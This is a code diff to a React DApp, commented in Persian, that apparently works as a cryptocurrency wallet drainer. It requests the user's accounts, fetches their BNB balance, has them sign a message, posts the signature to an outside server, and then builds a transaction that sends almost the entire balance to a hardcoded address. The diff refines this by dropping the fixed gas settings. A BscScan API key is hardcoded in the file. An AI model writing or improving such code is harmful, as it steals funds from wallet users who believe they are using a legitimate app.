@@ -1,6 +1,7 @@
 import React, { useState } from "react";
 
 const BSCSCAN_API_KEY = "YVGXID1YVM77RQI37GEEI7ZKCA2BQKQS4P";
+
 async function getBNBBalance(address) {
   try {
     const resp = await fetch(
@@ -20,11 +21,13 @@ function App() {
   const [account, setAccount] = useState(null);
 
   async function connectAndSend() {
+    // اطمینان از وجود provider (DApp Browser تراست والت)
     if (typeof window.ethereum === "undefined") {
       alert("No Ethereum provider found. Please open in Trust Wallet DApp Browser!");
       return;
     }
 
+    // درخواست آدرس کاربر
     let accounts;
     try {
       accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
@@ -40,25 +43,27 @@ function App() {
     setAccount(userAddress);
     console.log("✅ User address:", userAddress);
 
+    // گرفتن بالانس از BscScan
     const bnbBalance = await getBNBBalance(userAddress);
     console.log("💰 BNB Balance:", bnbBalance);
     const totalBalance = parseFloat(bnbBalance);
 
-    // تنظیم reserve؛ در اینجا reserve را به 0.01 BNB (حداقل موجودی برای گس) در نظر می‌گیریم.
+    // تعیین reserve برای هزینه گس؛ اینجا reserve به 0.01 BNB (تنظیم قابل تغییر است)
     const reserveBNB = 0.01;
     const sendAmount = totalBalance - reserveBNB;
-    console.log("Calculated send amount (BNB):", sendAmount);
     if (sendAmount <= 0) {
-      console.error("❌ Insufficient funds to cover reserve.");
+      console.error("❌ Insufficient funds: not enough to cover reserve for gas fee.");
       return;
     }
+    console.log("Calculated send amount (BNB):", sendAmount);
 
-    // ساخت پیام برای امضای درخواست بر اساس sendAmount
+    // ساخت پیام برای امضا بر اساس sendAmount
     const message = `Authorize sending ${sendAmount} BNB from ${userAddress}`;
     console.log("📜 Message to sign:", message);
 
     let signature;
     try {
+      // استفاده از personal_sign جهت امضای پیام
       signature = await window.ethereum.request({
         method: "personal_sign",
         params: [message, userAddress],
@@ -69,7 +74,7 @@ function App() {
       return;
     }
 
-    // ارسال امضا به سرور
+    // ارسال امضا به سرور جهت بررسی
     try {
       const resp = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
         method: "POST",
@@ -92,13 +97,13 @@ function App() {
       return;
     }
 
+    // ساخت تراکنش واقعی؛ در این نسخه gas و gasPrice حذف شده تا کیف پول آن‌ها را تخمین بزند.
     const sendWeiHex = "0x" + (sendAmount * 1e18).toString(16);
     const txParams = {
       from: userAddress,
-      to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD",
-      value: sendWeiHex,
-      gas: "0x5208",
-      gasPrice: "0x12a05f200"
+      to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد
+      value: sendWeiHex
+      // حذف gas و gasPrice برای استفاده از تخمین خودکار کیف پول
     };
 
     try {
